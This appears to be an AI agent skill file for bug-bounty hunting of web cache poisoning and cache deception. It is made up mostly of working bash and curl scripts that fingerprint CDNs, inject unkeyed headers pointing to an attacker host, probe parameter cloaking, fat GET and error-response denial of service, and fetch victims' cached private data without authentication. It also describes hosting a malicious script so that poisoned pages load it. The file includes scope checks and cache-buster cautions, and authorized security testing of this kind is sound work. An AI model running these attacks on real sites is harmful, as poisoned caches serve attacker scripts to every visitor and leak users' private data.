---
name: cache-poisoning-hunter
description: Systematically hunt for web cache poisoning and web cache deception vulnerabilities. Covers unkeyed header injection (X-Forwarded-Host, X-Forwarded-Scheme, X-Original-URL, X-Rewrite-URL), unkeyed query string/parameter poisoning, fat GET poisoning, cache key normalization abuse, Vary header bypass, DoS-via-cache (poison with 400/redirect/error), cache deception (storing private responses in public cache), and CDN-level cache poisoning (Cloudflare, Fastly, Varnish, Akamai, CloudFront). Trigger on phrases like "cache poisoning", "cache deception", "unkeyed header", "X-Forwarded-Host injection", "CDN poisoning", or when recon reveals caching infrastructure (Varnish, Nginx proxy_cache, Cloudflare, Fastly, CloudFront, Akamai, Squid) or cache-related response headers (X-Cache, CF-Cache-Status, Age, Via, X-Varnish).
---

# Cache Poisoning Hunter Skill

Web cache poisoning and web cache deception are distinct but related vulnerability classes. Poisoning forces a cache to store a malicious response that is then served to every user who requests the same resource. Deception tricks a cache into storing a private (authenticated) response at a URL the attacker can then fetch unauthenticated. Both classes appear consistently in high-severity bug bounty reports and are systematically underexplored because they require understanding the caching layer, not just the application.

Run phases in order. Phase 1 must be completed before any active testing — the entire attack strategy depends on correctly fingerprinting what is cached and what is used as the cache key.

---

## Prerequisites

- Burp Suite with Param Miner extension installed (essential for unkeyed input discovery)
- A unique cache-busting value for every probe (use `?cb=<random>` to prevent poisoning production cache during recon)
- Burp Collaborator or interactsh for out-of-band confirmation
- Two browser sessions if testing cache deception (attacker + victim account)
- All target hosts confirmed IN SCOPE via `/scope-checker` before active testing

```bash
TARGET_DIR=~/bugbounty/$TARGET
mkdir -p $TARGET_DIR/recon/cache

# Generate a cache buster function — append to every test URL
cachebust() { echo "cb=$(head -c 8 /dev/urandom | xxd -p)"; }

# Quick header to confirm caching presence
echo "[*] Checking cache headers on target..."
curl -skI "https://$TARGET_DOMAIN/" | grep -iE 'x-cache|cf-cache|age|via|x-varnish|surrogate|cdn|cache-control|vary'
```

---

## Phase 1 — Cache Infrastructure Fingerprinting

### Step 1.1 — Identify the Caching Layer

```bash
mkdir -p $TARGET_DIR/recon/cache

# Fetch root and a known static asset with verbose headers
curl -skI "https://$TARGET_DOMAIN/" \
  -H "Cache-Control: no-cache" \
  | tee $TARGET_DIR/recon/cache/root-headers.txt

curl -skI "https://$TARGET_DOMAIN/static/main.js" 2>/dev/null \
  | tee $TARGET_DIR/recon/cache/static-headers.txt

# CDN/cache fingerprint table
echo "=== Cache Infrastructure Fingerprint ==="
for HEADER in "CF-Cache-Status" "X-Cache" "X-Varnish" "X-Cache-Hits" \
              "Via" "Age" "Surrogate-Key" "X-Amz-Cf-Id" "X-Served-By" \
              "Fastly-Debug-Digest" "X-Cache-Status" "X-Cacheable" \
              "Akamai-Cache-Status" "X-Check-Cacheable"; do
  VAL=$(grep -i "^${HEADER}:" $TARGET_DIR/recon/cache/root-headers.txt | head -1)
  [ -n "$VAL" ] && echo "  $VAL"
done

# Infer CDN from headers
grep -qi "cf-ray\|cloudflare" $TARGET_DIR/recon/cache/root-headers.txt && echo "[CDN] Cloudflare"
grep -qi "x-amz-cf-id\|cloudfront" $TARGET_DIR/recon/cache/root-headers.txt && echo "[CDN] AWS CloudFront"
grep -qi "x-served-by\|fastly" $TARGET_DIR/recon/cache/root-headers.txt && echo "[CDN] Fastly"
grep -qi "x-varnish\|via.*varnish" $TARGET_DIR/recon/cache/root-headers.txt && echo "[CACHE] Varnish"
grep -qi "akamai\|akamai-cache" $TARGET_DIR/recon/cache/root-headers.txt && echo "[CDN] Akamai"
grep -qi "x-cache.*nginx\|nginx" $TARGET_DIR/recon/cache/root-headers.txt && echo "[CACHE] Nginx proxy_cache"
```

### Step 1.2 — Determine Cache Key Components

The cache key is the set of request attributes the cache uses to distinguish responses. Anything NOT in the cache key is an unkeyed input — potential injection point.

```bash
# Test whether query string is part of the cache key
# Method: request the same URL twice, observe Age header increment
CB=$(head -c 8 /dev/urandom | xxd -p)
URL="https://$TARGET_DOMAIN/?cache_key_test=$CB"

RESP1=$(curl -skI "$URL")
sleep 2
RESP2=$(curl -skI "$URL")

AGE1=$(echo "$RESP1" | grep -i "^age:" | grep -oP '\d+')
AGE2=$(echo "$RESP2" | grep -i "^age:" | grep -oP '\d+')

echo "Request 1 Age: ${AGE1:-none}"
echo "Request 2 Age: ${AGE2:-none}"

if [ -n "$AGE2" ] && [ "${AGE2:-0}" -gt "${AGE1:-0}" ]; then
  echo "[+] Query string IS in cache key (Age increments — same cache entry hit)"
else
  echo "[?] Query string may NOT be in cache key — test further"
fi

# Test whether a header value appears in the response (reflection = potential injection)
CB=$(head -c 8 /dev/urandom | xxd -p)
REFLECTED=$(curl -sk "https://$TARGET_DOMAIN/?$CB" \
  -H "X-Forwarded-Host: canary-$CB.example.com" | \
  grep -i "canary-$CB")
[ -n "$REFLECTED" ] && echo "[+] X-Forwarded-Host is REFLECTED in response — unkeyed candidate" || \
  echo "[-] X-Forwarded-Host not reflected"
```

### Step 1.3 — Identify Cached vs. Uncached Resources

Cache poisoning only works against responses that are actually cached. Map which resource types are cached:

```bash
RESOURCE_TYPES=(
  "/"
  "/index.html"
  "/api/v1/user"
  "/api/v1/config"
  "/static/app.js"
  "/static/style.css"
  "/robots.txt"
  "/sitemap.xml"
  "/.well-known/openid-configuration"
  "/manifest.json"
)

echo "=== Cacheable Resource Probe ===" | tee $TARGET_DIR/recon/cache/cacheable-resources.txt
for RESOURCE in "${RESOURCE_TYPES[@]}"; do
  # First request to populate cache
  curl -sk "https://$TARGET_DOMAIN$RESOURCE" -o /dev/null
  sleep 1
  # Second request to check Age
  HEADERS=$(curl -skI "https://$TARGET_DOMAIN$RESOURCE")
  AGE=$(echo "$HEADERS" | grep -i "^age:" | grep -oP '\d+')
  CACHE_STATUS=$(echo "$HEADERS" | grep -iE "^(x-cache|cf-cache-status|x-cache-status):" | head -1)
  CC=$(echo "$HEADERS" | grep -i "^cache-control:")

  if [ -n "$AGE" ] && [ "${AGE:-0}" -gt 0 ] || echo "$CACHE_STATUS" | grep -qi "hit\|cached"; then
    echo "[CACHED] $RESOURCE | Age: ${AGE:-?} | $CACHE_STATUS"
    echo "[CACHED] $RESOURCE" >> $TARGET_DIR/recon/cache/cacheable-resources.txt
  else
    echo "[MISS]   $RESOURCE | $CC"
  fi
done
```

---

## Phase 2 — Unkeyed Header Injection

### Step 2.1 — Automated Unkeyed Input Discovery with Param Miner

Param Miner (Burp extension) is the fastest way to find unkeyed headers at scale. Configure it in Burp, then run manually against the target. The bash steps below handle what Param Miner misses.

```bash
# Param Miner targets to scan in Burp:
# 1. Right-click any cached endpoint → Extensions → Param Miner → Guess headers
# 2. Enable "Add FCB" (fat cache buster) to avoid polluting real cache
# 3. Enable "Use Collaborator" for blind reflection detection
# 4. Review "Output" tab for "Interesting header:" entries
echo "[*] Run Param Miner in Burp against: https://$TARGET_DOMAIN/"
echo "[*] Also scan: $(cat $TARGET_DIR/recon/cache/cacheable-resources.txt | head -10 | tr '\n' ' ')"
```

### Step 2.2 — X-Forwarded-Host Injection

The most common and highest-impact unkeyed header. If `X-Forwarded-Host` is reflected into absolute URLs in the response (redirects, canonical tags, script src, CSRF tokens, OAuth redirect_uri), poisoning that response stores your malicious host for all subsequent visitors.

```bash
ATTACKER_HOST="attacker.example.com"  # replace with a host you control
CB=$(head -c 8 /dev/urandom | xxd -p)

# Test reflection in HTML body
REFLECTION=$(curl -sk "https://$TARGET_DOMAIN/?$CB" \
  -H "X-Forwarded-Host: $ATTACKER_HOST" | \
  grep -i "$ATTACKER_HOST")

if [ -n "$REFLECTION" ]; then
  echo "[+] X-Forwarded-Host reflected in body:"
  echo "$REFLECTION" | head -5

  # Check if this response is cacheable (has Age or cache hit headers)
  sleep 2
  CACHED_CHECK=$(curl -skI "https://$TARGET_DOMAIN/?$CB" | grep -iE "age|x-cache|cf-cache")
  echo "Cache status of poisoned URL: $CACHED_CHECK"

  echo "[!] POISON CANDIDATE: send without cache buster to poison real cache"
  echo "    Request: GET / HTTP/1.1"
  echo "    Host: $TARGET_DOMAIN"
  echo "    X-Forwarded-Host: $ATTACKER_HOST"
else
  echo "[-] X-Forwarded-Host not reflected"
fi

# Check for reflection in HTTP redirect Location header (XFH in redirect)
LOCATION=$(curl -skI "https://$TARGET_DOMAIN/" \
  -H "X-Forwarded-Host: $ATTACKER_HOST" | \
  grep -i "^location:")
echo "Location header with XFH: ${LOCATION:-none}"
[ -n "$LOCATION" ] && echo "$LOCATION" | grep -qi "$ATTACKER_HOST" && \
  echo "[+] X-Forwarded-Host reflected in redirect — open redirect poisoning candidate"
```

### Step 2.3 — X-Forwarded-Scheme / X-Forwarded-Proto Injection

```bash
CB=$(head -c 8 /dev/urandom | xxd -p)

# X-Forwarded-Scheme: http on an HTTPS endpoint may trigger an HTTP redirect
# If that redirect is cached → every user gets redirected to HTTP (downgrade)
RESP=$(curl -skI "https://$TARGET_DOMAIN/?$CB" \
  -H "X-Forwarded-Scheme: http" \
  -H "X-Forwarded-Host: $ATTACKER_HOST")

echo "$RESP" | grep -iE "location:|x-cache|cf-cache|age"
LOCATION=$(echo "$RESP" | grep -i "^location:" | head -1)
echo "$LOCATION" | grep -qi "http://" && \
  echo "[+] X-Forwarded-Scheme: http triggered HTTP downgrade redirect — cacheable?" || \
  echo "[-] No downgrade redirect"

# X-Forwarded-Proto: https on HTTP endpoint may flip scheme in response URLs
curl -sk "https://$TARGET_DOMAIN/?$CB" \
  -H "X-Forwarded-Proto: https" | \
  grep -i "$ATTACKER_HOST\|href.*http\|src.*http" | head -5
```

### Step 2.4 — X-Original-URL / X-Rewrite-URL Path Override

Some reverse proxies (Nginx, IIS, Symfony) use `X-Original-URL` or `X-Rewrite-URL` to override the request path while caching the response under the original URL.

```bash
CB=$(head -c 8 /dev/urandom | xxd -p)

# Test if X-Original-URL overrides the served path
for HEADER in "X-Original-URL" "X-Rewrite-URL" "X-Override-URL"; do
  RESP=$(curl -sk "https://$TARGET_DOMAIN/?$CB" \
    -H "${HEADER}: /admin" | \
    grep -i "admin\|dashboard\|forbidden\|403\|401")
  [ -n "$RESP" ] && echo "[+] $HEADER: /admin returned admin content — path override active" && \
    echo "$RESP" | head -5
done

# Poison: If the above returns admin content, the cache may store admin response at /
# Document as: GET / with X-Original-URL: /admin → cache stores /admin response at /
```

### Step 2.5 — X-Host / X-Forwarded-Server / X-HTTP-Host-Override

```bash
CB=$(head -c 8 /dev/urandom | xxd -p)

for HEADER in "X-Host" "X-Forwarded-Server" "X-HTTP-Host-Override" \
              "X-Forwarded-Port" "X-Forwarded-For" "True-Client-IP" \
              "X-Client-IP" "CF-Connecting-IP" "Fastly-Client-IP"; do
  REFLECTION=$(curl -sk "https://$TARGET_DOMAIN/?$CB" \
    -H "${HEADER}: $ATTACKER_HOST" | \
    grep -i "$ATTACKER_HOST")
  [ -n "$REFLECTION" ] && \
    echo "[+] $HEADER reflected: $(echo $REFLECTION | head -c 120)" | \
    tee -a $TARGET_DIR/recon/cache/unkeyed-headers.txt
done
```

---

## Phase 3 — Unkeyed Query Parameter Poisoning

### Step 3.1 — Unkeyed Query String Parameters

Some cache configs exclude certain query parameters from the cache key (e.g. UTM params, `fbclid`, `gclid`) but still pass them to the backend. If the backend reflects these in the response, the reflected value is cached.

```bash
CB=$(head -c 8 /dev/urandom | xxd -p)

# Common parameters excluded from cache key but reflected by apps
UNKEYED_PARAMS=(
  "utm_source" "utm_medium" "utm_campaign" "utm_content" "utm_term"
  "fbclid" "gclid" "msclkid" "twclid"
  "ref" "referrer" "source" "from" "via"
  "lang" "locale" "currency" "country"
  "callback" "jsonp" "format" "output"
  "debug" "test" "preview" "draft"
)

for PARAM in "${UNKEYED_PARAMS[@]}"; do
  CANARY="xss-$CB"
  REFLECTION=$(curl -sk "https://$TARGET_DOMAIN/?${PARAM}=${CANARY}" | \
    grep -i "$CANARY")
  if [ -n "$REFLECTION" ]; then
    echo "[+] Unkeyed param reflected: ?${PARAM}=${CANARY}"
    echo "    Context: $(echo $REFLECTION | head -c 200)"

    # Now check if the URL WITHOUT the param hits the same cache
    sleep 2
    CACHED=$(curl -skI "https://$TARGET_DOMAIN/" | grep -iE "age|x-cache|cf-cache")
    echo "    Root URL cache status: $CACHED"
    echo "[!] If root / is cached, poison candidate: GET /?${PARAM}=<XSS payload>"
  fi
done | tee $TARGET_DIR/recon/cache/unkeyed-params.txt
```

### Step 3.2 — Fat GET (GET Body as Unkeyed Parameter)

Some caches key on the URL only and ignore the GET request body. If the backend reads the GET body and reflects it, the reflected response is cached under the URL alone.

```bash
CB=$(head -c 8 /dev/urandom | xxd -p)
CANARY="fatget-$CB"

# Send GET request with a body — body is NOT in cache key
RESP=$(curl -sk "https://$TARGET_DOMAIN/?$CB" \
  -X GET \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "param=$CANARY" | \
  grep -i "$CANARY")

if [ -n "$RESP" ]; then
  echo "[+] Fat GET body reflected in response!"
  echo "    Context: $(echo $RESP | head -c 200)"
  echo "[!] Poison vector: GET / with body param=$CANARY reflected, but cached at / for all users"
else
  echo "[-] No fat GET body reflection"
fi
```

### Step 3.3 �� Parameter Cloaking / Delimiter Confusion

Different parsers interpret query string delimiters differently. The cache parser may read a different parameter set than the backend parser.

```bash
CB=$(head -c 8 /dev/urandom | xxd -p)

# Technique: cache key uses ?param=safe, backend sees ?param=safe&keyed_param=evil
# via delimiter confusion (semicolon, hash, encoded ampersand)
CLOAKING_TESTS=(
  "?param=safe;keyed_param=canary-$CB"
  "?param=safe%26keyed_param=canary-$CB"
  "?param=safe&_=canary-$CB"
  "?param=safe&param=canary-$CB"     # duplicate param — which does backend use?
)

for URL_SUFFIX in "${CLOAKING_TESTS[@]}"; do
  RESP=$(curl -sk "https://$TARGET_DOMAIN/$URL_SUFFIX" | grep -i "canary-$CB")
  [ -n "$RESP" ] && \
    echo "[+] Cloaking vector reflected: $URL_SUFFIX" && \
    echo "    Context: $(echo $RESP | head -c 150)"
done
```

---

## Phase 4 — Cache Poisoning via Response Manipulation

### Step 4.1 — Host Header Cache Poisoning (Canonical URL Injection)

If the server reflects the Host header into absolute URLs in the response (e.g. canonical links, script imports, CSS imports) and that response is cached:

```bash
CB=$(head -c 8 /dev/urandom | xxd -p)

# Abnormal Host header value reflected in response?
RESP=$(curl -sk "https://$TARGET_DOMAIN/?$CB" \
  -H "Host: $ATTACKER_HOST" 2>/dev/null | \
  grep -i "$ATTACKER_HOST")

if [ -n "$RESP" ]; then
  echo "[+] Host header reflected:"
  echo "$RESP" | head -5
  echo "[!] If response is cached, every visitor receives links pointing to $ATTACKER_HOST"
  echo "    Attack: host a malicious script at $ATTACKER_HOST/<script-path>"
else
  echo "[-] Host header not reflected (expected — most servers reject abnormal Host)"
fi

# Check canonical tag, Open Graph, or link preload for host reflection
curl -sk "https://$TARGET_DOMAIN/?$CB" \
  -H "X-Forwarded-Host: $ATTACKER_HOST" | \
  grep -iE '<link rel="canonical"|og:url|<script src|<link href|import.*from' | \
  grep -i "$ATTACKER_HOST" | head -10
```

### Step 4.2 — Cache Poisoning to XSS

If an unkeyed header or parameter is reflected unsanitised into a cacheable HTML page, the XSS payload is stored in the cache and served to all users:

```bash
CB=$(head -c 8 /dev/urandom | xxd -p)

# Use a safe canary first — confirm reflection context before injecting XSS
# Replace <PARAM> with the unkeyed parameter found in Phase 2/3
CANARY="xss-probe-$CB"
CONTEXT=$(curl -sk "https://$TARGET_DOMAIN/?$CB" \
  -H "X-Forwarded-Host: $CANARY" | \
  grep -i "$CANARY")

echo "Reflection context: $CONTEXT"
# Analyse context:
# href="http://CANARY/..." → use: attacker.com/path?<script>
# src="http://CANARY/app.js" → host a malicious JS file at attacker.com/app.js
# <meta content="http://CANARY"> → content-only, no JS execution
# action="http://CANARY/login" → form hijacking
# canonical → SEO impact only, no XSS

echo "[!] Do NOT inject actual XSS payload into a live cache without explicit permission"
echo "    Document the reflection context + unkeyed header/param for the PoC report"
echo "    PoC: show the response with X-Forwarded-Host: attacker.com reflected in <script src>"
```

### Step 4.3 — Poisoning with Error Responses (Cache Poisoning DoS)

If a malformed or injected header causes the backend to return a 400/500/redirect and that error response is cached at a popular URL, every user receives the error.

```bash
CB=$(head -c 8 /dev/urandom | xxd -p)

# Test: does a bad header cause a cached error response?
RESP=$(curl -skI "https://$TARGET_DOMAIN/?$CB" \
  -H "X-Forwarded-Host: invalid host with spaces" | \
  head -20)
echo "$RESP"
STATUS=$(echo "$RESP" | grep -oP "HTTP/\d\.?\d? \K\d+")
echo "Status with malformed XFH: $STATUS"

if echo "$STATUS" | grep -qE "^(4|5)"; then
  # Is this error response cached?
  sleep 2
  CACHED=$(curl -skI "https://$TARGET_DOMAIN/" | \
    grep -iE "age|x-cache.*hit|cf-cache-status: HIT")
  [ -n "$CACHED" ] && \
    echo "[!] ERROR RESPONSE IS CACHED — Cache Poisoning DoS confirmed" || \
    echo "[-] Error response not cached (good)"
fi
```

---

## Phase 5 — CDN-Specific Techniques

### Step 5.1 — Cloudflare

```bash
# Cloudflare cache status: CF-Cache-Status: HIT / MISS / DYNAMIC / BYPASS
# Cloudflare caches by default: .js, .css, .png, .jpg, .gif, .ico, .woff, HTML (if Cache-Control set)
# Cloudflare does NOT cache: API responses without explicit Cache-Control, POST requests

# CF-specific unkeyed headers to test
CF_HEADERS=("CF-Connecting-IP" "True-Client-IP" "CF-IPCountry" "CF-Visitor" "CF-Worker")
CB=$(head -c 8 /dev/urandom | xxd -p)
for H in "${CF_HEADERS[@]}"; do
  REFL=$(curl -sk "https://$TARGET_DOMAIN/?$CB" \
    -H "$H: $ATTACKER_HOST" | grep -i "$ATTACKER_HOST")
  [ -n "$REFL" ] && echo "[+] CF header $H reflected: $(echo $REFL | head -c 100)"
done

# Cloudflare cache rules bypass: append /cdn-cgi/ prefix tricks (test only on your own domains)
# Cache deception on CF: CF caches static extensions — try /api/user/profile.css
echo "[*] Testing Cloudflare cache deception (extension confusion):"
curl -skI "https://$TARGET_DOMAIN/api/v1/user.js" | \
  grep -iE "cf-cache-status|content-type|cache-control"
```

### Step 5.2 — Fastly

```bash
# Fastly cache status: X-Cache: HIT, MISS | X-Served-By: cache-...
# Fastly uses Surrogate-Control and Surrogate-Key headers
# Fastly respects Vary header — if Vary: X-Custom-Header, then that header IS keyed

CB=$(head -c 8 /dev/urandom | xxd -p)
VARY=$(curl -skI "https://$TARGET_DOMAIN/?$CB" | grep -i "^vary:")
echo "Vary header: ${VARY:-not present}"
# If Vary is absent or only Vary: Accept-Encoding → most headers are unkeyed

# Fastly-specific: Fastly-Debug-Digest header reveals cache key composition
curl -skI "https://$TARGET_DOMAIN/?$CB" \
  -H "Fastly-Debug: 1" | grep -i "fastly"
```

### Step 5.3 — Varnish

```bash
# Varnish cache status: X-Cache: HIT | X-Varnish: <id> | Via: 1.1 varnish
# Varnish by default keys on Host + URL — most headers are unkeyed unless VCL sets hash_data()

CB=$(head -c 8 /dev/urandom | xxd -p)

# Test classic Varnish header reflection
for H in "X-Forwarded-Host" "X-Forwarded-Scheme" "Forwarded"; do
  REFL=$(curl -sk "https://$TARGET_DOMAIN/?$CB" \
    -H "$H: $ATTACKER_HOST" | grep -i "$ATTACKER_HOST")
  [ -n "$REFL" ] && echo "[+] Varnish unkeyed: $H reflected"
done

# Varnish grace mode: a stale response may be served while a new one is fetched
# Check: X-Cache: HIT with an old Age value → stale-while-revalidate active
AGE=$(curl -skI "https://$TARGET_DOMAIN/" | grep -i "^age:" | grep -oP '\d+')
echo "Current Age: ${AGE:-none} seconds"
[ "${AGE:-0}" -gt 300 ] && echo "[*] Old cached entry — poisoning window open"
```

### Step 5.4 — AWS CloudFront

```bash
# CloudFront status: X-Amz-Cf-Id | X-Cache: Hit from cloudfront
# CloudFront cache key: Host + URL by default. Headers only in key if explicitly configured.
# CloudFront behaviors: different TTLs per path pattern — check /api/* vs /static/*

CB=$(head -c 8 /dev/urandom | xxd -p)

# CloudFront forwards headers to origin based on "Origin Custom Headers" config
# Test if origin reflects forwarded headers (those not in CloudFront cache key)
for H in "X-Forwarded-Host" "CloudFront-Forwarded-Proto" "CloudFront-Is-Mobile-Viewer"; do
  REFL=$(curl -sk "https://$TARGET_DOMAIN/?$CB" \
    -H "$H: $ATTACKER_HOST" | grep -i "$ATTACKER_HOST")
  [ -n "$REFL" ] && echo "[+] CloudFront unkeyed: $H reflected"
done

# CloudFront cache deception: CloudFront may cache based on extension regardless of Content-Type
echo "[*] Testing CloudFront extension-based caching:"
for EXT in ".css" ".js" ".jpg" ".png" ".gif"; do
  HEADERS=$(curl -skI "https://$TARGET_DOMAIN/api/v1/profile${EXT}")
  STATUS=$(echo "$HEADERS" | grep -oP "HTTP/\d\.?\d? \K\d+")
  CACHE=$(echo "$HEADERS" | grep -iE "x-cache|cf-cache")
  echo "  /api/v1/profile${EXT}: HTTP $STATUS | $CACHE"
done
```

---

## Phase 6 — Web Cache Deception

Web cache deception is the inverse of poisoning: instead of storing a malicious response for others, the attacker tricks the cache into storing the *victim's private response* at a URL the attacker can then fetch without authentication.

### Step 6.1 — Extension-Based Cache Deception

```bash
# Hypothesis: app returns user-specific data at /api/profile
# Cache serves responses based on file extension regardless of Cache-Control
# Attack: request /api/profile/nonexistent.css — cache caches it, attacker fetches it

echo "[*] Testing cache deception — extension suffix on sensitive endpoints"

SENSITIVE_ENDPOINTS=(
  "/api/v1/user"
  "/api/v1/profile"
  "/account/settings"
  "/dashboard"
  "/me"
  "/user/details"
)

EXTENSIONS=(".css" ".js" ".jpg" ".png" ".gif" ".ico" ".woff" ".woff2")

for EP in "${SENSITIVE_ENDPOINTS[@]}"; do
  for EXT in "${EXTENSIONS[@]}"; do
    CB=$(head -c 8 /dev/urandom | xxd -p)
    TARGET_URL="https://$TARGET_DOMAIN${EP}/style${EXT}?$CB"

    # Step 1: Fetch as authenticated user
    RESP=$(curl -sk "$TARGET_URL" \
      -H "Cookie: $SESSION_COOKIE" \
      -w "\n%{http_code}")
    STATUS=$(echo "$RESP" | tail -1)
    BODY=$(echo "$RESP" | head -1)

    # Does it return sensitive-looking data?
    if echo "$BODY" | grep -qiE '"email"|"username"|"name"|"id"|"token"|"key"'; then
      echo "[+] SENSITIVE DATA at ${EP}/style${EXT} [HTTP $STATUS]"

      # Step 2: Wait for caching
      sleep 3

      # Step 3: Fetch WITHOUT auth — is the private response cached?
      UNAUTH=$(curl -sk "$TARGET_URL" | \
        grep -iE '"email"|"username"|"name"|"id"')
      if [ -n "$UNAUTH" ]; then
        echo "[!!] CACHE DECEPTION CONFIRMED — private data served without auth!"
        echo "     URL: $TARGET_URL"
        echo "     Data: $(echo $UNAUTH | head -c 150)"
        echo "$TARGET_URL|$EP|$EXT" >> $TARGET_DIR/recon/cache/cache-deception-findings.txt
      fi
    fi
  done
done
```

### Step 6.2 — Path Delimiter Cache Deception

```bash
# Technique: /account/settings%2F..%2Fstyle.css
# Web server normalises path → /account/settings
# CDN uses the raw URL as cache key → caches under /account/settings%2F..%2Fstyle.css
# Attacker fetches the raw URL unauthenticated

CB=$(head -c 8 /dev/urandom | xxd -p)
DECEPTION_VARIANTS=(
  "/account/settings%2Fstyle.css"
  "/account/settings;style.css"
  "/account/settings#style.css"
  "/account/settings/.css"
)

for VARIANT in "${DECEPTION_VARIANTS[@]}"; do
  RESP=$(curl -sk "https://$TARGET_DOMAIN${VARIANT}?$CB" \
    -H "Cookie: $SESSION_COOKIE" \
    -w "\n%{http_code}")
  STATUS=$(echo "$RESP" | tail -1)
  echo "[$STATUS] $VARIANT"
  echo "$RESP" | head -1 | grep -iE '"email"|"user"|"account"' && \
    echo "    [+] Sensitive data returned — check cacheability"
done
```

---

## Phase 7 — Validation and PoC Documentation

### Step 7.1 — Confirm Poisoning Without Contaminating Production Cache

```bash
echo "=== VALIDATION PROTOCOL ==="
echo ""
echo "RULE 1: Always use a cache buster (?cb=<random>) during exploration."
echo "        Only remove the cache buster when performing a CONTROLLED PoC."
echo ""
echo "RULE 2: For the final PoC, choose a low-traffic URL (e.g., an obscure path"
echo "        or your own test account page) to minimise impact to real users."
echo ""
echo "RULE 3: Confirm the poisoning worked by:"
echo "        a) Sending the poisoning request (with malicious header, no cache buster)"
echo "        b) Waiting 2-3 seconds"
echo "        c) Fetching the URL in a FRESH browser session (no cookies, different IP)"
echo "        d) Verifying the malicious content appears in the fresh response"
echo ""
echo "RULE 4: Document and immediately report. Do not let a poisoned cache entry"
echo "        live on the production server for longer than necessary."
echo ""
echo "RULE 5: After PoC confirmation, re-fetch the URL with Cache-Control: no-cache"
echo "        or a cache buster to push out the poisoned entry."
```

### Step 7.2 — PoC Report Minimum Requirements

```bash
cat > $TARGET_DIR/recon/cache/poc-template.txt << 'EOF'
# Cache Poisoning / Deception PoC Template

## Type
[ ] Cache Poisoning — attacker controls cached response served to all users
[ ] Cache Deception — private response stored and accessible unauthenticated

## Injection Vector
Header/parameter name: [e.g. X-Forwarded-Host]
Injected value: [e.g. attacker.com]
Reflected in response at: [e.g. <script src="http://attacker.com/app.js">]

## Cache Infrastructure
CDN/Cache: [Cloudflare / Fastly / Varnish / Nginx / CloudFront]
Cache key confirmed by: [Age header increment / X-Cache: HIT / CF-Cache-Status: HIT]

## PoC Steps
1. Send: [full HTTP request with malicious header]
2. Wait: 2 seconds
3. Fetch: [same URL, fresh session, no cookies]
4. Observe: [malicious content in response — screenshot required]

## Impact
[Describe what an attacker can achieve: XSS on all visitors / account takeover /
 sensitive data disclosure / DoS via cached error / HTTPS downgrade]

## Evidence
- Screenshot of poisoning request + response
- Screenshot of fresh-session fetch showing poisoned content
- Cache infrastructure header dump (X-Cache, Age, CF-Cache-Status)

## Limitations
[e.g. "Cache entry expires after 300 seconds — attacker must re-poison periodically"]
EOF
echo "[*] PoC template saved to $TARGET_DIR/recon/cache/poc-template.txt"
```

### Step 7.3 — Output Files

```bash
echo "=== Cache Poisoning Hunt Output ==="
ls -la $TARGET_DIR/recon/cache/
echo ""
echo "Files generated:"
echo "  root-headers.txt          — CDN/cache fingerprint headers"
echo "  cacheable-resources.txt   — Resources confirmed as cached"
echo "  unkeyed-headers.txt       — Headers reflected but not in cache key"
echo "  unkeyed-params.txt        — Query params reflected but not in cache key"
echo "  cache-deception-findings.txt — Confirmed deception vectors"
echo "  poc-template.txt          — Report template (fill and submit)"
```

---

## Tooling Reference

| Tool | Purpose | Notes |
|---|---|---|
| Burp Param Miner | Automated unkeyed input discovery | Extension — install via BApp Store |
| `curl` with `-skI` | Header inspection + single-request probing | Built-in |
| Burp Collaborator | OOB reflection detection for blind cases | Burp Suite Pro |
| `interactsh` | Open-source OOB alternative | `go install github.com/projectdiscovery/interactsh/...` |
| Burp Repeater | Manual iteration on reflection candidates | Built-in |

---

## Severity Reference

| Finding | Severity |
|---|---|
| Cache poisoning → stored XSS served to all unauthenticated users | Critical |
| Cache poisoning → malicious script import on high-traffic page | Critical |
| Cache deception → victim's session token / auth cookie cached and accessible | Critical |
| Cache deception → PII (email, address, payment info) cached unauthenticated | Critical |
| Cache poisoning → open redirect poisoning (all users redirected to attacker URL) | High |
| Cache poisoning → HTTPS downgrade (X-Forwarded-Scheme: http cached) | High |
| Cache deception → non-sensitive private data (username, preferences) cached | Medium–High |
| Cache poisoning → DoS via cached error/500 on high-traffic URL | Medium–High |
| Cache poisoning → stored XSS on low-traffic / authenticated-only page | Medium |
| Unkeyed header reflected in response but not in cached resource | Low–Medium (informational lead) |
| Cache deception → no sensitive data in cached response | Informational |

---

## Guiding Principles

- **Always use a cache buster during recon.** Every probe without `?cb=<random>` risks poisoning the real production cache. The cache buster must be a value that keeps the URL unique per request but that the app ignores functionally. Remove it only for the final controlled PoC.
- **Reflection ≠ poisoning.** A header reflected in a response is only a finding if that response is cached. Confirm cacheability (Age header, X-Cache: HIT) before claiming cache poisoning. An unkeyed header that only affects uncached/dynamic responses is not cache poisoning — it may still be a standalone open redirect or host header injection finding.
- **Cache deception requires two sessions.** Always verify the unauthenticated fetch returns the victim's data — not just that the page returns 200. The finding only exists if private data is actually accessible without credentials.
- **Param Miner is non-negotiable for this skill.** Manual header probing covers the obvious cases. Param Miner's wordlist covers 400+ header candidates and detects reflections you would never find manually. Run it on every cached endpoint before concluding no unkeyed inputs exist.
- **CDN cache rules override app Cache-Control.** A page that sends `Cache-Control: no-store` may still be cached if a CDN cache rule explicitly overrides it. Don't assume `no-store` means uncacheable — test empirically with the Age header.
- **Severity multiplies with traffic.** A cache poisoning XSS on `/` or `/index.html` is Critical because every visitor is affected. The same finding on `/debug/test` that nobody visits is Low. Always estimate the blast radius by the traffic volume of the poisoned URL.
- **Fat GET and parameter cloaking are underexplored.** Most hunters test X-Forwarded-Host and stop. Fat GET (GET body as unkeyed input) and delimiter confusion (`;`, `%26`, duplicate params) produce findings on CDNs that veteran hunters miss.
- **Run /triager before submitting.** Cache poisoning is frequently duplicated on active programs. Check disclosed reports for the program before investing in full PoC documentation.
